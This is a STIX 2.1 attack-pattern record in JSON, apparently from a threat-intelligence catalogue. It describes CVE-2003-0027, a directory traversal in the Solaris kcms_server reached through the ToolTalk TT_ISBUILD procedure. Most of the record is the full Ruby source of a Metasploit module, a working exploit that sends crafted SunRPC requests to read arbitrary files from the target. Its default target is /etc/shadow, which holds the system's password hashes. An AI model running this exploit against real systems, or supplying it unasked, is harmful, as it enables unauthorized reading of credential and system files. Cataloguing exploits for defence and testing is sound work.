{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4f797e72-0fbe-4ede-9a7c-373b8a97c1dd",
    "created": "2024-08-14T16:22:21.245933Z",
    "modified": "2024-08-14T16:22:21.245936Z",
    "name": "Solaris KCMS + TTDB Arbitrary File Read",
    "description": " This module targets a directory traversal vulnerability in the kcms_server component from the Kodak Color Management System. By utilizing the ToolTalk Database Server\\'s TT_ISBUILD procedure, an attacker can bypass existing directory traversal validation and read arbitrary files.  Vulnerable systems include Solaris 2.5 - 9 SPARC and x86. Both kcms_server and rpc.ttdbserverd must be running on the target host. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/sunrpc/solaris_kcms_readfile.rb",
            "external_id": "solaris_kcms_readfile.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0027"
        },
        {
            "source_name": "reference",
            "url": "http://marc.info/?l=bugtraq&m=104326556329850&w=2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SunRPC\n\n  def initialize\n    super(\n      'Name'           => 'Solaris KCMS + TTDB Arbitrary File Read',\n      'Description'    => %q{\n          This module targets a directory traversal vulnerability in the\n        kcms_server component from the Kodak Color Management System. By\n        utilizing the ToolTalk Database Server\\'s TT_ISBUILD procedure, an\n        attacker can bypass existing directory traversal validation and\n        read arbitrary files.\n\n        Vulnerable systems include Solaris 2.5 - 9 SPARC and x86. Both\n        kcms_server and rpc.ttdbserverd must be running on the target\n        host.\n      },\n      'Author'         =>\n        [\n          'vlad902 <vlad902[at]gmail.com>', # MSF v2 module\n          'jduck'  # Ported to MSF v3\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2003-0027'],\n          ['OSVDB', '8201'],\n          ['BID', '6665'],\n          ['URL', 'http://marc.info/?l=bugtraq&m=104326556329850&w=2']\n        ],\n      # Tested OK against sol8.tor 20100624 -jjd\n      'DisclosureDate' => 'Jan 22 2003')\n\n    register_options(\n      [\n        OptString.new('PATH', [ true, \"Path to the file to disclose, relative to the root dir.\", 'etc/shadow']),\n        OptString.new('OUTPUTPATH', [ false, \"Local path to save the file contents to\", nil ])\n      ])\n  end\n\n  def run\n\n    # There is a fixed size buffer in use, so make sure we don't exceed it..\n    # (NOTE: 24 bytes are reserved for traversal string)\n    path = datastore['PATH']\n    if (path.length > 1000)\n      raise RuntimeError, \"File name is too long.\"\n    end\n\n    print_status(\"Making request to the ToolTalk Database Server...\")\n\n    # Hopefully one of these works ;)\n    ttdb_build(\"/etc/openwin/devdata/profiles/TT_DB/oid_container\")\n    ttdb_build(\"/etc/openwin/etc/devdata/TT_DB/oid_container\")\n\n    # If not, we'll find out now ...\n    print_status(\"Making open() request to the kcms_server...\")\n    sunrpc_create('tcp', 100221, 1)\n    sunrpc_authunix('localhost', 0, 0, [])\n\n    # Prepare the traversing request for kcms_server\n    trav = 'TT_DB/' + ('../' * 5) + path\n    buf = Rex::Encoder::XDR.encode(\n      [trav, 1024],\n      0, # O_RDONLY\n      0755) # mode\n\n    # Make the request\n    ret = sunrpc_call(1003, buf)\n    ack, fsize, fd = Rex::Encoder::XDR.decode!(ret, Integer, Integer, Integer)\n\n    if (ack != 0)\n      print_error(\"KCMS open() failed (ack: 0x%x != 0)\" % ack)\n\n      if (fsize == 0)\n        print_status(\"File does not exist (or host is patched)\")\n      end\n      return\n    end\n\n    # Nice, open succeeded, show the return data\n    print_status(\"fd: #{fd}, file size #{fsize}\")\n\n    print_status(\"Making read() request to the kcms_server...\")\n    buf = Rex::Encoder::XDR.encode(\n      fd,\n      0,\n      fsize)\n\n    ret = sunrpc_call(1005, buf)\n    x, data = Rex::Encoder::XDR.decode!(ret, Integer, [Integer])\n\n    # If we got something back...\n    if (data)\n      data = data.pack('C*')\n\n      # Store or display the results\n      if (datastore['OUTPUTPATH'])\n        fname = datastore['PATH'].gsub(/[\\/\\\\]/, '_')\n        outpath = File.join(datastore['OUTPUTPATH'], fname)\n        print_status(\"Saving contents to #{outpath} ...\")\n        File.open(outpath, \"wb\") { |fd|\n          fd.write(data)\n        }\n      else\n        print_status(\"File contents:\")\n        print_status(data.inspect)\n      end\n    else\n      print_error(\"No data returned!\")\n    end\n\n    # Close it regardless if it returned anything..\n    print_status(\"Making close() request to the kcms_server...\")\n    buf = Rex::Encoder::XDR.encode(fd)\n    sunrpc_call(1004, buf)\n\n    # done\n    sunrpc_destroy\n\n  rescue Timeout::Error, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Rex::Proto::SunRPC::RPCError => e\n    print_error(e.to_s)\n  rescue ::Rex::Proto::SunRPC::RPCTimeout\n    print_warning 'Warning: ' + $!\n    print_warning 'Exploit may or may not have succeeded.'\n  end\n\n\n  #\n  # Send a TT_ISBUILD request to rpc.ttdbserverd\n  #\n  def ttdb_build(path)\n    sunrpc_create('tcp', 100083, 1)\n    sunrpc_authunix('localhost', 0, 0, [])\n    msg = Rex::Encoder::XDR.encode(\n      [path, 1024],\n      path.length,\n      1, # KEY (VArray head?)\n      2,\n      1,\n      0, # KEYDESC\n      2,\n      1,\n      # 21 zeros, /KEYDESC, /KEY\n      0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n      0x10002,\n      path.length)\n    ret = sunrpc_call(3, msg)\n    arr = Rex::Encoder::XDR.decode!(ret, Integer, Integer)\n    print_status(\"TTDB reply: 0x%x, %d\" % arr)\n    sunrpc_destroy\n  end\nend\n",
    "x_mitre_disclosure_date": "Jan 22 2003"
}